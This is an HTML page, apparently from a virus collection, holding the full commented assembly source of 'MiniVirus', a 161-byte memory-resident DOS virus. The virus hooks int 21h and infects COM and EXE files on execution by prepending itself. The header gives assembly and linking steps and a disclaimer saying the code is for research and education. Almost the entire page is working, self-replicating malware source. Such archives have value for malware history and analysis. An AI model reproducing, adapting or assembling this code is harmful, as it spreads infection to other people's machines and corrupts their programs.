<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Tiny.161 - MINIVIR.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; *************************************************************************</span><span class="sc0">
</span><span class="sc1">; ********************                                 ********************</span><span class="sc0">
</span><span class="sc1">; ********************             MiniVirus           ********************</span><span class="sc0">
</span><span class="sc1">; ********************                by               ********************</span><span class="sc0">
</span><span class="sc1">; ********************            BLACK JACK           ********************</span><span class="sc0">
</span><span class="sc1">; ********************                                 ********************</span><span class="sc0">
</span><span class="sc1">; *************************************************************************</span><span class="sc0">

</span><span class="sc1">; comment ~</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; NAME: MiniVirus (AVs will call it SillyCER.161, I guess)</span><span class="sc0">
</span><span class="sc1">; AUTHOR: Black Jack /LineZer0 /Metaphase</span><span class="sc0">
</span><span class="sc1">; TYPE: Memory resident prepending infector of DOS EXE and COM files.</span><span class="sc0">
</span><span class="sc1">; SIZE: 161 bytes!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; COMMENTS: This virus was written for the tiny '99 open, the coding contest of</span><span class="sc0">
</span><span class="sc1">;     the *-zine #2. Therefore it is stripped down to its bare bones and</span><span class="sc0">
</span><span class="sc1">;     as optimized as possible. </span><span class="sc0">
</span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc1">; DESCRIPTION: When an infected file is run, the virus will install itself</span><span class="sc0">
</span><span class="sc1">;        memory resident in the upper half of the interrupt vector table,</span><span class="sc0">
</span><span class="sc1">;        if it wasn't memory resident before. Then it will hook int 21h</span><span class="sc0">
</span><span class="sc1">;        and redirect the original vector to int 3, which will fool some</span><span class="sc0">
</span><span class="sc1">;        debuggers and is more optimized. It will then infect EXE and COM</span><span class="sc0">
</span><span class="sc1">;        files on execute. The virus will prepend its body and save the</span><span class="sc0">
</span><span class="sc1">;        original beginning of the file to the end (non-destructive</span><span class="sc0">
</span><span class="sc1">;        overwriting). EXE files are infected exactly the same way as COM</span><span class="sc0">
</span><span class="sc1">;        files, that means that they are converted to COM format</span><span class="sc0">
</span><span class="sc1">;        internally, and the EXE header will be interptreted manually by</span><span class="sc0">
</span><span class="sc1">;        the virus. To reduce code, the virus will only infect EXE files</span><span class="sc0">
</span><span class="sc1">;        without an relocation table. The virus won't infect any NewExe</span><span class="sc0">
</span><span class="sc1">;        files or files that are too big or too small. It won't reinfect</span><span class="sc0">
</span><span class="sc1">;        memory or files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; DRAWBACKS: - depends on initial registers (instable, DOS version dependant)</span><span class="sc0">
</span><span class="sc1">;      - can only infect very few EXE files</span><span class="sc0">
</span><span class="sc1">;      - uses the upper half of the IVT -&gt; instable</span><span class="sc0">
</span><span class="sc1">;      - not ENUNS compatible, will corrupt COM and EXE files of DOS7</span><span class="sc0">
</span><span class="sc1">;        (also the EXEs have an ENUNS signature in the beginning, but</span><span class="sc0">
</span><span class="sc1">;        this only makes problems with prependers like this).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ASSEMBLE WITH: </span><span class="sc0">
</span><span class="sc1">;       TASM /M minivir</span><span class="sc0">
</span><span class="sc1">;       TLINK minivir</span><span class="sc0">
</span><span class="sc1">;       EXE2BIN minivir.exe minivir.com</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; DISCLAIMER: I do *NOT* support the spreading of virii in the wild. Therefore,</span><span class="sc0">
</span><span class="sc1">;       this source was only written for research and education. Please</span><span class="sc0">
</span><span class="sc1">;       do not spread it. The author and his groups can't be hold</span><span class="sc0">
</span><span class="sc1">;       responsible for what you decide to do with this source.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc4">~</span><span class="sc0">
</span><span class="sc1">; ===== CODE STARTS HERE ====================================================</span><span class="sc0">

</span><span class="sc5">virus_length</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))</span><span class="sc0">
</span><span class="sc5">revector</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; The virus assumes the following register values at startup:</span><span class="sc0">
    </span><span class="sc1">; most significant word of EAX=0</span><span class="sc0">
    </span><span class="sc1">; BH=0</span><span class="sc0">
    </span><span class="sc1">; CX=00FFh</span><span class="sc0">
    </span><span class="sc1">; DX=DS=PSP segment</span><span class="sc0">
    </span><span class="sc1">; SI=IP=100h</span><span class="sc0">
    </span><span class="sc1">; DF=0</span><span class="sc0">
    
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                          </span><span class="sc1">; "M" - infection mark</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; ES=0 (IVT segment)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; restore zero at top of stack</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; save DS=PSP segment to stack</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">; save SI=100h to stack</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">                    </span><span class="sc1">; ES:DI=0:200h (upper half of IVT)</span><span class="sc0">

    </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">; scan first byte of IVT for AL=0</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">                      </span><span class="sc1">; es:[di] != 0 ==&gt; already resident</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; set DI back to 200h</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int21h</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0">  </span><span class="sc1">; EAX=new vector for int21h</span><span class="sc0">
                    </span><span class="sc1">; (most significant word of EAX is 0)</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">+</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; set viral int21h routine (SI=100h)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">revector</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; save old int21h vector to int3</span><span class="sc0">
                    </span><span class="sc1">; (int 3 =&gt; optimized and anti-debug)</span><span class="sc0">

                    </span><span class="sc1">; DOS kindly set the following</span><span class="sc0">
                    </span><span class="sc1">; values for us:</span><span class="sc0">
                    </span><span class="sc1">; DS:SI=start of virus in mem</span><span class="sc0">
                    </span><span class="sc1">; CX=00FFh</span><span class="sc0">
                    </span><span class="sc1">; DF=0</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; copy virus to upper half of the IVT</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                         </span><span class="sc1">; mov ax, imm16</span><span class="sc0">
</span><span class="sc5">offset_org_start</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">              </span><span class="sc1">; int 20h in PSP to quit 1st gen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                     </span><span class="sc1">; BX=10h (BH is already zero)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">; push segment 10h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_retf</span><span class="sc0">                      </span><span class="sc1">; push offset restore+100h</span><span class="sc0">
                    </span><span class="sc1">; the retf jumps to restore in the IVT</span><span class="sc0">

</span><span class="sc1">; ----- RESTORE HOST --------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">restore</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; ES:DI=Program entry point on stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; SI = offset of original file start</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; move original .COM start back</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">          </span><span class="sc1">; is the host an .EXE file?        </span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_length</span><span class="sc0">            </span><span class="sc1">; CH is already zero</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; move original .COM start back</span><span class="sc0">

    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">restore_exe</span><span class="sc0">

</span><span class="sc5">_retf</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; execute host</span><span class="sc0">
    
</span><span class="sc5">restore_exe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; restore DI</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; move the whole host back</span><span class="sc0">
                    </span><span class="sc1">; (DI afterwards will be SI before)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc5">virus_length</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; size of header in paragraphs</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; convert to bytes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; DI=100h (PSP size)</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; move host where it belongs</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; add PSP size to DX (=CS)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                </span><span class="sc1">; fix code-segment address</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; DX=stack-segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; set original stack segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; set original stack-pointer (BX=10h)</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; jump to original entry point!</span><span class="sc0">


</span><span class="sc1">; ----- INT 21h HOOK --------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">new_int21h</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">                     </span><span class="sc1">; execute?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">org_int21h</span><span class="sc0">                  </span><span class="sc1">; if so, infect .COM/.EXE</span><span class="sc0">

</span><span class="sc5">infect_exec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; save registers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                   </span><span class="sc1">; open file r/w</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; handle to BX where it belongs</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; DS=CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300h</span><span class="sc0">                    </span><span class="sc1">; SI=buffer for COM start/EXE header</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                     </span><span class="sc1">; read from file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_length</span><span class="sc0">            </span><span class="sc1">; length of virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; DS:DX=pointer to buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; filelength &lt; viruslength ?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                       </span><span class="sc1">; if so, don't infect</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">; move filepointer to EOF</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">; DX=0; CX was already 0 before</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">offset_org_start</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; save length of file (=offset of</span><span class="sc0">
                    </span><span class="sc1">; original com start or EXE header)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; write to file/NewExe marker</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">       </span><span class="sc1">; is it already infected or EXE?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">com_file</span><span class="sc0">                    </span><span class="sc1">; it's an uninfected .COM file</span><span class="sc0">
    
</span><span class="sc5">exe_file</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; test if it is an infectable .EXE</span><span class="sc0">
                    </span><span class="sc1">; (will also avoid reinfections)</span><span class="sc0">
                    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; no relocation items? (DX=0 if the</span><span class="sc0">
                    </span><span class="sc1">; file is smaller than 64KB,otherwise</span><span class="sc0">
                    </span><span class="sc1">; we can't infect the file anyways)</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                       </span><span class="sc1">; close if it has an relo table</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">; is it any new exe file?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                        </span><span class="sc1">; we just want to infect DOS EXEs</span><span class="sc0">
    
</span><span class="sc5">com_file</span><span class="sc4">:</span><span class="sc0">
                    </span><span class="sc1">; write original com start to EOF                                        </span><span class="sc0">
                    </span><span class="sc1">; AH is already 40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; DS:DX=pointer to buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_length</span><span class="sc0">            </span><span class="sc1">; CX=length to write (CH is already 0)</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; save all registers</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">; move filepointer to beginning of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; DX:CX=0 (new offset relative to SOF)</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">; DX=0</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">
    
    </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; AH=40h; CX=virus_length; DL=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; DX=200h=start of virus in memory</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">                    </span><span class="sc1">; write firus into file</span><span class="sc0">
    
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                     </span><span class="sc1">; close file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; restore registers</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">org_int21h</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; back to original int 21h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">revector</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    
</span><span class="sc5">end_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
